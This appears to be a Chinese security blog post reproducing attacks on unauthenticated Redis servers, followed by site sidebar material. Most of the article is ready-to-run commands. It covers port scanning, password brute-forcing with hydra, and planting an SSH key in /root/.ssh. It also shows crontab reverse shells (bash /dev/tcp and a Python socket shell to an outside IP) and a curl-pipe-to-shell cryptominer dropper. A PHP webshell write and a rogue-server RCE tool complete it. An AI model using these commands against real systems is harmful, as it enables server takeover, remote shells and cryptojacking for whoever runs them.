+<h3 id="1-获取主机端口开放信息"><a href="#1-获取主机端口开放信息" class="headerlink" title="1 获取主机端口开放信息"></a>1 获取主机端口开放信息</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="keyword">A</span> -p <span class="number">6379</span> --script=redis-info <span class="number">10.240.210.110</span></span><br><span class="line">-<span class="keyword">A</span> 同时打开操作系统指纹和版本检测，等同于-O -sV</span><br></pre></td></tr></table></figure>
+<h3 id="2-Redis未授权访问获取敏感信息"><a href="#2-Redis未授权访问获取敏感信息" class="headerlink" title="2 Redis未授权访问获取敏感信息"></a>2 Redis未授权访问获取敏感信息</h3><p>Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.240.210.110</span><br><span class="line">info <span class="comment"># 可以看到Redis的版本和服务器上内核版本信息，如果是新版的Redis2.8以后的版本还可以看到Redis配置文件的绝对路径</span></span><br><span class="line">keys *  </span><br><span class="line">get key <span class="comment"># 可以查看key和对应的值</span></span><br><span class="line">flushall <span class="comment"># 删除所有数据</span></span><br><span class="line">del key <span class="comment"># 删除键为key的数据</span></span><br><span class="line">CONFIG GET dir <span class="comment"># 获取redis数据目录</span></span><br><span class="line">CONFIG GET dbfilename  <span class="comment"># 获取rdb文件名 ！再修改前先获取，恢复需要</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-利用hydra暴力破解redis的密码"><a href="#0x02-利用hydra暴力破解redis的密码" class="headerlink" title="0x02 利用hydra暴力破解redis的密码"></a>0x02 利用hydra暴力破解redis的密码</h2><p>如果redis设置了密码，且密码轻度低，可通过暴力破解获取密码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span>  -P <span class="number">500</span>-worst-passwords.txt redis://<span class="number">10.240.210.110</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03-写ssh-keygen公钥然后使用私钥登陆"><a href="#0x03-写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="0x03 写ssh-keygen公钥然后使用私钥登陆"></a>0x03 写ssh-keygen公钥然后使用私钥登陆</h2><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓存文件authorized.keys,把缓存的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生成一个授权的key。</p>
+<ul>
+<li>Redis服务使用ROOT账号启动</li>
+<li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>
+</ul>
+<ol>
+<li>首先本地生成key<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure></li>
+<li>redis 执行命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCef7YHGr3apU1h+ay+u4ytHeKuSbrgSl/l0D5p5oIZ/tMNtudy+voXzk16MTxaPo0YnwcnBAbIou8toDV2dec01eq6YnRgwASDwQQX5pAzsHA1yhktW46LWQ+4l3RctqYtBnL4azm+3gO49VrcTZbvTNDlsRAXLIcCPvQhNXY+X/8RmNcUMoReBt+uKXApiUOWMp5vADyMnBAmVN2/5QEk7Kbiw0Sd6Ma0GRZ4gMmXinCeMz1jU540DxM9Zqkkjk13sR/A0n7u7wIDyiUlsiNKU09yphMLedjXEcyNIwbFoTAHixxbj6I2CVlSj4AawcaMWRkLd4SA7yvM3S7cWhB root@localhost.localdomain</span></span><br><span class="line"><span class="string">\n\n\n&quot;</span>  <span class="comment"># 使用\n\n换行，避免和redis里面其他缓存数据混合</span></span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></li>
+<li>save保存后可以直接利用私钥登陆ssh<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@10.240.210.110</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-利用计划任务执行命令反弹shell"><a href="#0x04-利用计划任务执行命令反弹shell" class="headerlink" title="0x04 利用计划任务执行命令反弹shell"></a>0x04 利用计划任务执行命令反弹shell</h2>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</li>
+</ol>
+<p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p>
+<ol>
+<li><p>现在自己服务器上监听一个端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">50000</span></span><br></pre></td></tr></table></figure></li>
+<li><p>连接redis，写入反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.240.210.110:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.240.210.111/50000 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>python 反弹shell</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="symbol">\&quot;</span>115.28.78.16<span class="symbol">\&quot;</span>,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="symbol">\&quot;</span>/bin/sh<span class="symbol">\&quot;</span>,<span class="symbol">\&quot;</span>-i<span class="symbol">\&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>1分钟之后服务器接收到反弹的shell</p>
+</li>
+</ol>
+<p>其他比如写入挖矿程序原理和这个是一样的，通过计划任务，到指定网站下载挖矿木马和shell脚本</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="number">1</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!bin/bash</span></span><br><span class="line">PATH=<span class="regexp">/bin:/</span>sbin:<span class="regexp">/usr/</span>bin:<span class="regexp">/usr/</span>sbin:<span class="regexp">/usr/</span>local<span class="regexp">/bin:/u</span>sr<span class="regexp">/local/</span>sbin:~/bin</span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;/tmp/watch-smartd&quot;</span> ];</span><br><span class="line">    then</span><br><span class="line">        wget http:<span class="regexp">//</span><span class="number">10.240</span>.<span class="number">210.111</span><span class="regexp">/watch/</span>watch-smartd -O <span class="regexp">/tmp/</span>watch-smartd</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        chmod +x <span class="regexp">/tmp/</span>watch-smartd</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>连接redis，写入计划任务</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span><span class="keyword">var</span><span class="operator">/</span>spool<span class="operator">/</span>cron</span><br><span class="line">config <span class="keyword">set</span> dbfilename root</span><br><span class="line"><span class="keyword">set</span> xxx <span class="string">&quot;<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>*/5 * * * * curl http://10.240.210.111/watch/1.sh | sh<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"><span class="keyword">set</span> xxxx <span class="string">&quot;<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>*/1 * * * * /tmp/./watch-smartd<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>1分钟后，在centos的/tmp目录下可以看到挖矿木马watch-smartd,并且具有x权限，使用top命令，可以看到挖矿木马已经执行，占用大量的cpu</p>
+<h2 id="0x05-在web目录下写入webshell"><a href="#0x05-在web目录下写入webshell" class="headerlink" title="0x05 在web目录下写入webshell"></a>0x05 在web目录下写入webshell</h2><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell，用菜刀连接可达到控制服务器的目的。</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.240.210.110:6379</span>&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.240.210.110:6379</span>&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.240.210.110:6379</span>&gt; set x <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">10.240.210.110:6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-利用redis执行命令"><a href="#0x06-利用redis执行命令" class="headerlink" title="0x06 利用redis执行命令"></a>0x06 利用redis执行命令</h2><p><strong>redis &lt; 2.6</strong> 内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span>  hello.<span class="keyword">lua</span></span><br><span class="line"></span><br><span class="line">local msg = <span class="string">&quot;hello,hack!&quot;</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>
+<p>在客户端连接redis服务器并执行hello.lua</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">redis</span>-cli eval <span class="string">&quot;$(cat hello.lua)&quot;</span> <span class="number">0</span> -h <span class="number">10.240.210.110</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-Redis-基于主从复制的RCE-复现"><a href="#0x07-Redis-基于主从复制的RCE-复现" class="headerlink" title="0x07 Redis 基于主从复制的RCE 复现"></a>0x07 Redis 基于主从复制的RCE 复现</h2><p>前面几种通过未授权的redis写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据，这种主要利用了crontab、ssh key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了</p>
+<p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Redis 4.x/5.x</strong> </p>
+<h3 id="通过主从复制getshell"><a href="#通过主从复制getshell" class="headerlink" title="通过主从复制getshell"></a>通过主从复制getshell</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>在<strong>Reids 4.x</strong>之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
+<p>通过编写恶意so文件，执行命令</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> redis-rogue-server.py --rhost <span class="number">10.240.210.110</span> --rport <span class="number">6379</span> --lhost <span class="number">10.240.210.111</span> --lport <span class="number">50000</span></span><br></pre></td></tr></table></figure>
+<img src="/redis/1.png" class="" title="描述">
+
+<h2 id="0x09-其他"><a href="#0x09-其他" class="headerlink" title="0x09 其他"></a>0x09 其他</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lifuwei/p/9173782.html">redis中五种数据类型操作命令集锦</a></li>
+<li><a target="_blank" rel="noopener" href="https://redis.io/">Redis 官网</a></li>
+<li><a target="_blank" rel="noopener" href="http://try.redis.io/">Redis 在线测试</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158065.html">Redis未授权访问详解 </a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">Redis 基于主从复制的 RCE 利用 POC</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">Redis 基于主从复制的 RCE 利用方式</a></li>
+</ul>
+-->
+      
+
+    </div>
+
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+
+    <footer class="article-footer">
+      
+        <a data-url="http://www.pa55w0rd.online/redis/" data-id="ckoms13i600389csw3jdd06j6" class="article-share-link" data-share="baidu" data-title="Redis的一些漏洞复现利用">分享到</a>
+      
+
+      
+        <a href="http://www.pa55w0rd.online/redis/#gitalk-container" class="article-comment-link">留言</a>
+      
+
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/" rel="tag">note</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/linux-process-in-background/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">← 上一篇</strong>
+      <div class="article-nav-title">Linux 技巧：让进程在后台运行更可靠的几种方法（转发）</div>
+    </a>
+  
+  
+    <a href="/awvs-nessus/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇 →</strong>
+      <div class="article-nav-title">
+        
+          AWVS / NESSUS
+        
+      </div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+<!--
+<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+-->
+
+
+  <section class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section> 
+
+
+
+
+  <script type="text/javascript">document.write(unescape("%3Cdiv id='reward' %3E%3C/div%3E%3Cscript src='/js/reward.min.js' type='text/javascript'%3E%3C/script%3E"));</script>
+  <div id="gitalk-container"></div>
+
+
+</section>
+      
+      <aside   id="sidebar">
+  
+    
+  <div class="widget-wrap">
+
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/iast/">洞态IAST在某互联网甲方的落地实践</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/OpenRASP-alert/">OpenRASP报警推送</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/openrasp-web/">OpenRASP 部署</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/phpshell/">一次php加密文件的分析</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/openrasp/">OpenRASP 单机版</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-tasks"></i>分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">41</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/">开发安全</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+  <script>
+  $(document).on("click", "ul.category-list li.category-list-item", function () {
+    window.location.href = $(this).find('a').attr('href')
+  })
+  </script>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-cloud"></i>标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 11.67px;">Android</a> <a href="/tags/Android-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/DevSecOps/" style="font-size: 10px;">DevSecOps</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/SDL/" style="font-size: 10px;">SDL</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.67px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.67px;">docker</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/jsonp%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 11.67px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">web安全</a> <a href="/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/" style="font-size: 10px;">业务安全</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">代码扫描</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="font-size: 10px;">内网安全</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%88%86%E6%9E%90/" style="font-size: 10px;">分析</a> <a href="/tags/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">前端加密</a> <a href="/tags/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/" style="font-size: 10px;">名词解释</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 11.67px;">基础</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 15px;">基础知识</a> <a href="/tags/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/" style="font-size: 10px;">基线加固</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 10px;">备忘录</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" style="font-size: 18.33px;">安全建设</a> <a href="/tags/%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">安全架构</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%92/" style="font-size: 10px;">安全规划</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83/" style="font-size: 13.33px;">安全规范</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/" style="font-size: 16.67px;">安全设计</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E8%AF%84%E5%AE%A1/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" style="font-size: 10px;">安全评估</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/" style="font-size: 10px;">安全运维</a> <a href="/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" style="font-size: 13.33px;">安全防护</a> <a href="/tags/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" style="font-size: 11.67px;">安装使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 18.33px;">工具使用</a> <a href="/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/" style="font-size: 11.67px;">平台建设</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 13.33px;">应急响应</a> <a href="/tags/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/" style="font-size: 15px;">开发安全</a> <a href="/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">开源工具</a> <a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 11.67px;">技巧</a> <a href="/tags/%E6%8C%87%E5%8D%97/" style="font-size: 10px;">指南</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">操作记录</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" style="font-size: 10px;">数据安全</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 10px;">未授权访问</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 13.33px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" style="font-size: 10px;">移动安全</a> <a href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" style="font-size: 10px;">等级保护</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">编程基础</a> <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" style="font-size: 18.33px;">解决方法</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">资产扫描</a> <a href="/tags/%E8%BF%81%E7%A7%BB/" style="font-size: 10px;">迁移</a> <a href="/tags/%E9%80%9F%E6%9F%A5%E8%A1%A8/" style="font-size: 10px;">速查表</a> <a href="/tags/%E9%9D%9Eweb%E5%9E%8Bxss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/" style="font-size: 10px;">验证码安全</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-archive"></i>归档</h3>
+    <div class="widget">
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
